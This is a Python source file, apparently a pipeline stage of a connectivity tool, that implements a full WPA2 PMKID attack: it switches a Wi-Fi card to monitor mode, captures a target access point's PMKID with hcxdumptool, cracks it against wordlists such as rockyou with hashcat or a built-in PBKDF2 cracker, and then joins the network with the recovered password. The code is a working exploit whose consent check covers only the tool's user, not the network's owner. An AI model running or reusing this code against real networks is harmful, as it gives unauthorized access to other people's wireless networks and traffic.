"""PMKID capture and crack stage — extract PMKID from WPA2 AP and dictionary attack.

The PMKID attack (CVE-2018-??) exploits the fact that the AP sends its PMKID
in the first message of the 4-way handshake. Unlike traditional handshake
capture, this requires NO client to be connected — we just need to send
an association request to the AP and capture its response.

Flow:
1. Put card into monitor mode
2. Run hcxdumptool to capture PMKID from target AP (10-30s)
3. Extract PMKID hash with hcxpcapngtool
4. Attempt dictionary crack with hashcat (or Python fallback)
5. If cracked, connect with discovered password

Requires: hcxdumptool, hcxtools (hcxpcapngtool), hashcat (optional)
All available via apt on Ubuntu.

REQUIRES EXPLICIT USER CONSENT — this stage performs active wireless probing
and password recovery.
"""

import hashlib
import hmac
import os
import re
import subprocess
import tempfile
import time

from logging_config import get_logger
from vasili import PipelineStage, StageResult

logger = get_logger(__name__)


def _check_tool(name: str) -> bool:
    """Check if a command-line tool is installed."""
    try:
        subprocess.run(
            ['which', name], capture_output=True, check=True, timeout=5
        )
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


class PmkidCaptureStage(PipelineStage):
    """Capture PMKID from a WPA2 AP and attempt dictionary crack.

    Only runs if:
    - Network is WPA2 (PMKID is a WPA2-specific vulnerability)
    - No internet from saved/configured credentials
    - hcxdumptool is installed
    - User has granted consent
    """
    name = 'pmkid_crack'
    requires_consent = True

    # Default small wordlist for quick attempts
    DEFAULT_WORDLIST_PATHS = [
        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__)))), 'wordlists', '10k-most-common.txt'),
        '/opt/vasili/wordlists/10k-most-common.txt',
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
    ]

    def can_run(self, network, card, context):
        # Only WPA2 networks, only if we don't already have internet
        if context.get('has_internet', False):
            return False
        if network.encryption_type != 'WPA2':
            return False
        if not _check_tool('hcxdumptool'):
            logger.debug('hcxdumptool not installed, skipping PMKID stage')
            return False
        return True

    def run(self, network, card, context):
        bssid = network.bssid
        interface = card.interface

        logger.info(f'PMKID capture starting for {network.ssid or bssid} on {interface}')

        with tempfile.TemporaryDirectory(prefix='vasili_pmkid_') as tmpdir:
            pcap_file = os.path.join(tmpdir, 'capture.pcapng')
            hash_file = os.path.join(tmpdir, 'pmkid.hc22000')

            # Step 1: Capture PMKID
            pmkid_hash = self._capture_pmkid(interface, bssid, pcap_file,
                                              hash_file, tmpdir)
            if not pmkid_hash:
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={'pmkid_captured': False},
                    message='Could not capture PMKID from AP',
                )

            logger.info(f'PMKID captured for {bssid}')

            # Step 2: Crack with wordlist
            password = self._crack_pmkid(pmkid_hash, hash_file, network.ssid,
                                          bssid, tmpdir)
            if not password:
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={
                        'pmkid_captured': True,
                        'pmkid_cracked': False,
                    },
                    message='PMKID captured but password not in wordlist',
                )

            logger.info(f'PMKID cracked! Password found for {network.ssid or bssid}')

            # Step 3: Restore managed mode and connect with found password
            card.ensure_managed()
            time.sleep(1)

            if card.connect(network, password=password):
                import network_isolation
                has_internet = network_isolation.verify_connectivity(interface)
                return StageResult(
                    success=True, has_internet=has_internet,
                    context_updates={
                        'pmkid_captured': True,
                        'pmkid_cracked': True,
                        'has_internet': has_internet,
                        'connected_with': 'pmkid',
                    },
                    message=f'PMKID cracked and connected' + (
                        ' — internet OK' if has_internet else ' — no internet'
                    ),
                )
            else:
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={
                        'pmkid_captured': True,
                        'pmkid_cracked': True,
                    },
                    message='Password found but connection failed',
                )

    def _capture_pmkid(self, interface: str, bssid: str,
                       pcap_file: str, hash_file: str,
                       tmpdir: str) -> bool:
        """Capture PMKID from AP using hcxdumptool.

        Returns True if PMKID hash was extracted successfully.
        """
        # Write target filter file (only capture from our target AP)
        filter_file = os.path.join(tmpdir, 'filter.txt')
        # hcxdumptool wants MAC without colons
        clean_bssid = bssid.replace(':', '').lower()
        with open(filter_file, 'w') as f:
            f.write(clean_bssid + '\n')

        # Put card into monitor mode
        if not card_set_monitor(interface):
            logger.error(f'Failed to set {interface} to monitor mode')
            return False

        try:
            # Run hcxdumptool for a short capture window
            # --enable_status=1: show status
            # -o: output pcapng file
            # --filterlist_ap: only target our AP
            # --filtermode=2: whitelist mode
            cmd = [
                'hcxdumptool',
                '-i', interface,
                '-o', pcap_file,
                '--filterlist_ap', filter_file,
                '--filtermode=2',
                '--enable_status=1',
            ]

            logger.info(f'Running hcxdumptool on {interface} targeting {bssid}')

            # Run for max 30 seconds — PMKID usually captured in <10s
            try:
                subprocess.run(
                    cmd, capture_output=True, text=True, timeout=30,
                )
            except subprocess.TimeoutExpired:
                # Expected — we stop after timeout
                pass

            # Kill any remaining hcxdumptool processes on this interface
            subprocess.run(
                ['pkill', '-f', f'hcxdumptool.*{interface}'],
                capture_output=True, check=False,
            )

            if not os.path.exists(pcap_file) or os.path.getsize(pcap_file) == 0:
                logger.info('No PMKID data captured')
                return False

            # Extract hash from pcapng
            if _check_tool('hcxpcapngtool'):
                result = subprocess.run(
                    ['hcxpcapngtool', '-o', hash_file, pcap_file],
                    capture_output=True, text=True, timeout=10,
                )
                if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                    return True
                logger.info(f'hcxpcapngtool output: {result.stdout} {result.stderr}')
            else:
                logger.warning('hcxpcapngtool not installed')

            return False

        finally:
            # Always restore managed mode
            card_set_managed(interface)

    def _crack_pmkid(self, pmkid_hash: bool, hash_file: str,
                     ssid: str, bssid: str, tmpdir: str) -> str | None:
        """Attempt to crack the PMKID hash.

        Tries hashcat first (fast, GPU if available), falls back to
        Python-based PBKDF2 for small wordlists.
        """
        # Try hashcat if available
        if _check_tool('hashcat'):
            password = self._crack_with_hashcat(hash_file, tmpdir)
            if password:
                return password

        # Python fallback for small wordlists
        return self._crack_python_fallback(hash_file, ssid, bssid)

    def _crack_with_hashcat(self, hash_file: str,
                            tmpdir: str) -> str | None:
        """Use hashcat to crack the PMKID hash."""
        wordlist = self._find_wordlist()
        if not wordlist:
            logger.info('No wordlist found for hashcat')
            return None

        outfile = os.path.join(tmpdir, 'cracked.txt')

        try:
            # hashcat mode 22000 = WPA-PBKDF2-PMKID+EAPOL
            result = subprocess.run(
                [
                    'hashcat', '-m', '22000',
                    '-a', '0',  # dictionary attack
                    '--quiet',
                    '--potfile-disable',
                    '-o', outfile,
                    hash_file,
                    wordlist,
                ],
                capture_output=True, text=True, timeout=300,  # 5 min max
            )

            if os.path.exists(outfile):
                with open(outfile) as f:
                    for line in f:
                        # Format: hash:password
                        parts = line.strip().rsplit(':', 1)
                        if len(parts) == 2:
                            return parts[1]

        except subprocess.TimeoutExpired:
            logger.warning('Hashcat timed out')
        except Exception as e:
            logger.error(f'Hashcat error: {e}')

        return None

    def _crack_python_fallback(self, hash_file: str,
                               ssid: str, bssid: str) -> str | None:
        """Pure Python PMKID crack using PBKDF2 for small wordlists.

        PMKID = HMAC-SHA1-128(PMK, "PMK Name" + MAC_AP + MAC_STA)
        PMK = PBKDF2(passphrase, ssid, 4096, 256)
        """
        # Read the hash file to get PMKID and MACs
        try:
            with open(hash_file) as f:
                hash_line = f.readline().strip()
        except Exception:
            return None

        if not hash_line:
            return None

        # Parse hashcat 22000 format:
        # WPA*02*pmkid*mac_ap*mac_sta*essid_hex*...
        parts = hash_line.split('*')
        if len(parts) < 6 or parts[0] != 'WPA':
            logger.debug(f'Unexpected hash format: {hash_line[:50]}')
            return None

        pmkid_hex = parts[2]
        mac_ap = bytes.fromhex(parts[3])
        mac_sta = bytes.fromhex(parts[4])
        essid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')

        target_pmkid = bytes.fromhex(pmkid_hex)

        wordlist = self._find_wordlist()
        if not wordlist:
            return None

        logger.info(f'Python PMKID crack: trying wordlist against "{essid}"')

        try:
            opener = open
            if wordlist.endswith('.gz'):
                import gzip
                opener = gzip.open

            with opener(wordlist, 'rt', errors='replace') as f:
                for i, line in enumerate(f):
                    if i > 50000:  # Limit Python fallback to 50k words
                        logger.info('Python PMKID crack: 50k word limit reached')
                        break

                    passphrase = line.strip()
                    if len(passphrase) < 8 or len(passphrase) > 63:
                        continue

                    # PMK = PBKDF2-SHA1(passphrase, essid, 4096, 32)
                    pmk = hashlib.pbkdf2_hmac(
                        'sha1', passphrase.encode(), essid.encode(), 4096, 32
                    )

                    # PMKID = HMAC-SHA1-128(PMK, "PMK Name" + MAC_AP + MAC_STA)
                    computed = hmac.new(
                        pmk, b'PMK Name' + mac_ap + mac_sta, hashlib.sha1
                    ).digest()[:16]

                    if computed == target_pmkid:
                        logger.info(f'PMKID cracked after {i+1} attempts')
                        return passphrase

        except Exception as e:
            logger.error(f'Python PMKID crack error: {e}')

        return None

    def _find_wordlist(self) -> str | None:
        """Find an available wordlist file."""
        for path in self.DEFAULT_WORDLIST_PATHS:
            if os.path.exists(path):
                return path
        return None

    def get_config_schema(self):
        return {
            'capture_timeout': {
                'type': 'int', 'default': 30,
                'description': 'Seconds to wait for PMKID capture from AP',
            },
            'wordlist_path': {
                'type': 'str', 'default': 'wordlists/10k-most-common.txt',
                'description': 'Path to wordlist file (empty = auto-detect from bundled + system lists)',
            },
            'max_python_words': {
                'type': 'int', 'default': 50000,
                'description': 'Max words for Python fallback cracker (no hashcat)',
            },
        }


def card_set_monitor(interface: str) -> bool:
    """Put a WiFi interface into monitor mode."""
    try:
        subprocess.run(
            ['ip', 'link', 'set', interface, 'down'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['iw', 'dev', interface, 'set', 'type', 'monitor'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['ip', 'link', 'set', interface, 'up'],
            check=True, capture_output=True, timeout=5,
        )
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f'Failed to set {interface} to monitor: {e}')
        return False


def card_set_managed(interface: str) -> bool:
    """Put a WiFi interface back into managed mode."""
    try:
        subprocess.run(
            ['ip', 'link', 'set', interface, 'down'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['iw', 'dev', interface, 'set', 'type', 'managed'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['ip', 'link', 'set', interface, 'up'],
            check=True, capture_output=True, timeout=5,
        )
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f'Failed to set {interface} to managed: {e}')
        return False
